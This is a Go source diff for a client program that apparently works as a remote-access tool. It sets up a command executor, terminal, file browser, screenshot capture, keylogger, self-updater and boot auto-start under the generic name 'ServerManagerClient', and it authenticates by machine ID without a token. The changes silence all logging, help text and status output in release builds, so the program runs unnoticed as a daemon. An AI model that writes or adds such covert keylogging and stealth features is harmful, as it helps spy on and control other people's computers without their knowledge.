@@ -61,24 +61,40 @@ type Config struct {
 
 // NewClient creates a new client instance
 func NewClient(config *Config, instanceMgr *InstanceManager) *Client {
-	log.Printf("[DEBUG] NewClient: Starting client creation")
-	log.Printf("[DEBUG] NewClient: Creating terminal manager")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Starting client creation")
+		log.Printf("[DEBUG] NewClient: Creating terminal manager")
+	}
 	terminalMgr := NewTerminalManager()
 
-	log.Printf("[DEBUG] NewClient: Creating command executor")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Creating command executor")
+	}
 	cmdExec := NewCommandExecutor()
-	log.Printf("[DEBUG] NewClient: Creating file browser")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Creating file browser")
+	}
 	fileBrowser := NewFileBrowser()
-	log.Printf("[DEBUG] NewClient: Creating screenshot capture")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Creating screenshot capture")
+	}
 	screenshot := NewScreenshotCapture()
-	log.Printf("[DEBUG] NewClient: Creating keylogger")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Creating keylogger")
+	}
 	keylogger := NewKeylogger()
-	log.Printf("[DEBUG] NewClient: Creating updater")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Creating updater")
+	}
 	updater := NewUpdater(ClientVersion)
-	log.Printf("[DEBUG] NewClient: Creating auto-start handler")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Creating auto-start handler")
+	}
 	autoStart := NewAutoStart("ServerManagerClient")
 
-	log.Printf("[DEBUG] NewClient: Assembling client struct")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Assembling client struct")
+	}
 	client := &Client{
 		config:      config,
 		commandExec: cmdExec,
@@ -93,7 +109,9 @@ func NewClient(config *Config, instanceMgr *InstanceManager) *Client {
 		instanceMgr: instanceMgr,
 		proxyConns:  make(map[string]net.Conn),
 	}
-	log.Printf("[DEBUG] NewClient: Client created successfully")
+	if ShouldLog() {
+		log.Printf("[DEBUG] NewClient: Client created successfully")
+	}
 
 	// Set terminal output callbacks
 	terminalMgr.SetOutputCallback(func(sessionID, data string) {
@@ -935,9 +953,11 @@ func Main() {
 	}()
 
 	// Build mode will be set by build tags (debug or release)
-	log.Printf("Client build mode: %s", BuildMode)
-	log.Printf("[DEBUG] Main: Starting client initialization")
-	log.Printf("[DEBUG] Main: Go version: %s, OS: %s, Arch: %s", runtime.Version(), runtime.GOOS, runtime.GOARCH)
+	if ShouldLog() {
+		log.Printf("Client build mode: %s", BuildMode)
+		log.Printf("[DEBUG] Main: Starting client initialization")
+		log.Printf("[DEBUG] Main: Go version: %s, OS: %s, Arch: %s", runtime.Version(), runtime.GOOS, runtime.GOARCH)
+	}
 
 	// Preserve original args for diagnostics and manual fallback parsing
 	origArgs := append([]string{}, os.Args...)
@@ -952,8 +972,10 @@ func Main() {
 			os.Args = append([]string{os.Args[0]}, os.Args[2:]...)
 		}
 	}
-	log.Printf("[DEBUG] Args original: %v", origArgs)
-	log.Printf("[DEBUG] Args after subcommand strip: %v", os.Args)
+	if ShouldLog() {
+		log.Printf("[DEBUG] Args original: %v", origArgs)
+		log.Printf("[DEBUG] Args after subcommand strip: %v", os.Args)
+	}
 
 	// Normalize boolean flags like `-daemon false` to `-daemon=false` before flag.Parse
 	if command == "start" || command == "restart" { // only relevant for start-like commands
@@ -985,7 +1007,9 @@ func Main() {
 			normalized = append(normalized, arg)
 		}
 		os.Args = normalized
-		log.Printf("[DEBUG] Args normalized: %v", os.Args)
+		if ShouldLog() {
+			log.Printf("[DEBUG] Args normalized: %v", os.Args)
+		}
 	}
 
 	instanceMgr := NewInstanceManager()
@@ -993,40 +1017,76 @@ func Main() {
 		switch command {
 		case "status":
 			if running, pid := instanceMgr.IsRunning(); running {
-				fmt.Printf("Client running (PID %d)\n", pid)
+				if ShowHelp {
+					fmt.Printf("Client running (PID %d)\n", pid)
+				}
+				os.Exit(0)
 			} else {
-				fmt.Println("Client not running")
+				if ShowHelp {
+					fmt.Println("Client not running")
+				}
+				os.Exit(1)
 			}
 			return
 		case "stop":
 			if err := instanceMgr.Kill(); err != nil {
-				fmt.Printf("Stop failed: %v\n", err)
+				if ShowHelp {
+					fmt.Printf("Stop failed: %v\n", err)
+				}
+				os.Exit(1)
 			} else {
-				fmt.Println("Client stopped")
+				if ShowHelp {
+					fmt.Println("Client stopped")
+				}
+				os.Exit(0)
 			}
 			return
 		case "restart":
 			_ = instanceMgr.Kill() // Ignore error; may not be running
 			// Continue to start below.
-			fmt.Println("Restarting client...")
+			if ShowHelp {
+				fmt.Println("Restarting client...")
+			}
 		}
 	}
 
 	// Enforce single instance before full start (except when restart bypassed)
 	if command == "start" {
 		if running, pid := instanceMgr.IsRunning(); running {
-			fmt.Printf("Client already running (PID %d)\n", pid)
+			if ShowHelp {
+				fmt.Printf("Client already running (PID %d)\n", pid)
+			}
 			return
 		}
 	}
 
 	// Parse command line flags (after removing subcommand)
+	// Disable help in release builds
+	if !ShowHelp {
+		flag.Usage = func() {} // Silent in release mode
+	} else {
+		flag.Usage = func() {
+			fmt.Fprintf(os.Stderr, "Usage: %s [command] [options]\n\n", os.Args[0])
+			fmt.Fprintf(os.Stderr, "Commands:\n")
+			fmt.Fprintf(os.Stderr, "  start     Start the client (default)\n")
+			fmt.Fprintf(os.Stderr, "  stop      Stop the running client\n")
+			fmt.Fprintf(os.Stderr, "  restart   Restart the client\n")
+			fmt.Fprintf(os.Stderr, "  status    Check if client is running\n\n")
+			fmt.Fprintf(os.Stderr, "Options:\n")
+			flag.PrintDefaults()
+		}
+	}
+
 	serverURL := flag.String("server", "wss://localhost/ws", "Server WebSocket URL (must include /ws path; use wss:// for HTTPS)")
 	autoStart := flag.Bool("autostart", DefaultAutoStart, fmt.Sprintf("Enable auto-start on boot (default: %v for %s build)", DefaultAutoStart, BuildMode))
 	daemon := flag.Bool("daemon", DefaultDaemon, fmt.Sprintf("Run as background daemon/service (default: %v for %s build)", DefaultDaemon, BuildMode))
-	log.Printf("[DEBUG] Main: Parsing command line flags")
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Parsing command line flags")
+	}
 	flag.Parse()
-	log.Printf("[DEBUG] Main: Flags parsed - server=%s, autostart=%v, daemon=%v", *serverURL, *autoStart, *daemon)
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Flags parsed - server=%s, autostart=%v, daemon=%v", *serverURL, *autoStart, *daemon)
+	}
 
 	// Manual fallback parsing if flag failed to capture value (some Windows shells edge cases)
 	if *serverURL == "wss://localhost/ws" { // unchanged from default
@@ -1034,14 +1094,18 @@ func Main() {
 			if a == "-server" || a == "--server" {
 				if i+1 < len(origArgs) {
 					*serverURL = origArgs[i+1]
-					log.Printf("[DEBUG] Manual flag recovery: server=%s", *serverURL)
+					if ShouldLog() {
+						log.Printf("[DEBUG] Manual flag recovery: server=%s", *serverURL)
+					}
 				}
 			}
 			if strings.HasPrefix(a, "-server=") || strings.HasPrefix(a, "--server=") {
 				parts := strings.SplitN(a, "=", 2)
 				if len(parts) == 2 && parts[1] != "" {
 					*serverURL = parts[1]
-					log.Printf("[DEBUG] Manual flag recovery (inline): server=%s", *serverURL)
+					if ShouldLog() {
+						log.Printf("[DEBUG] Manual flag recovery (inline): server=%s", *serverURL)
+					}
 				}
 			}
 		}
@@ -1050,7 +1114,9 @@ func Main() {
 	// Environment override (lowest priority after explicit flags)
 	if envServer := os.Getenv("SERVER_URL"); envServer != "" && (*serverURL == "" || *serverURL == "wss://localhost/ws") {
 		*serverURL = envServer
-		log.Printf("[DEBUG] SERVER_URL env override applied: %s", *serverURL)
+		if ShouldLog() {
+			log.Printf("[DEBUG] SERVER_URL env override applied: %s", *serverURL)
+		}
 	}
 
 	// Ensure /ws suffix (server expects /ws endpoint); if missing, append
@@ -1060,14 +1126,22 @@ func Main() {
 		} else {
 			*serverURL = *serverURL + "/ws"
 		}
-		log.Printf("[DEBUG] Appended /ws to server URL: %s", *serverURL)
+		if ShouldLog() {
+			log.Printf("[DEBUG] Appended /ws to server URL: %s", *serverURL)
+		}
 	}
 
 	// Run as daemon if requested
 	if *daemon && !IsDaemon() {
-		log.Println("Starting as background daemon...")
+		if ShouldLog() {
+			log.Println("Starting as background daemon...")
+		}
 		if err := Daemonize(); err != nil {
-			log.Fatalf("Failed to daemonize: %v", err)
+			if ShouldLog() {
+				log.Fatalf("Failed to daemonize: %v", err)
+			} else {
+				os.Exit(1)
+			}
 		}
 		return
 	}
@@ -1079,21 +1153,30 @@ func Main() {
 	}
 
 	// Generate machine ID automatically
-	log.Printf("[DEBUG] Main: Creating machine ID generator")
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Creating machine ID generator")
+	}
 	idGen := NewMachineIDGenerator()
-	log.Printf("[DEBUG] Main: Getting machine ID")
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Getting machine ID")
+	}
 	machineID, err := idGen.GetMachineID()
 	if err != nil {
 		// Fallback: use hostname + time-based hash to avoid exit
-		log.Printf("[DEBUG] Main: Machine ID generation failed: %v", err)
+		if ShouldLog() {
+			log.Printf("[DEBUG] Main: Machine ID generation failed: %v", err)
+		}
 		host, _ := os.Hostname()
 		machineID = fmt.Sprintf("fallback-%s-%d", host, time.Now().Unix())
-		log.Printf("Warning: using fallback machine ID: %s (error: %v)", machineID, err)
+		if ShouldLog() {
+			log.Printf("Warning: using fallback machine ID: %s (error: %v)", machineID, err)
+		}
 	}
-	log.Printf("[DEBUG] Main: Machine ID obtained: %s", machineID)
-
-	log.Printf("Machine ID: %s", machineID)
-	log.Printf("Authentication: Using machine ID (no token required)")
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Machine ID obtained: %s", machineID)
+		log.Printf("Machine ID: %s", machineID)
+		log.Printf("Authentication: Using machine ID (no token required)")
+	}
 
 	config := &Config{
 		ServerURL: *serverURL,
@@ -1103,19 +1186,27 @@ func Main() {
 	}
 
 	// Create and start client
-	log.Printf("[DEBUG] Main: Creating client instance")
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Creating client instance")
+	}
 	client := NewClient(config, instanceMgr)
-	log.Printf("[DEBUG] Main: Client created, starting connection loop")
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Client created, starting connection loop")
+	}
 	for {
 		if err := client.Start(); err != nil {
-			log.Printf("Failed to start client: %v (retrying in 10s)", err)
+			if ShouldLog() {
+				log.Printf("Failed to start client: %v (retrying in 10s)", err)
+			}
 			time.Sleep(10 * time.Second)
 			continue
 		}
 		break
 	}
 
-	log.Printf("[DEBUG] Main: Client started successfully, entering wait loop (server=%s)", config.ServerURL)
+	if ShouldLog() {
+		log.Printf("[DEBUG] Main: Client started successfully, entering wait loop (server=%s)", config.ServerURL)
+	}
 	// Wait until process killed externally; simple sleep loop to allow Stop() to run on termination
 	for {
 		if !client.running {
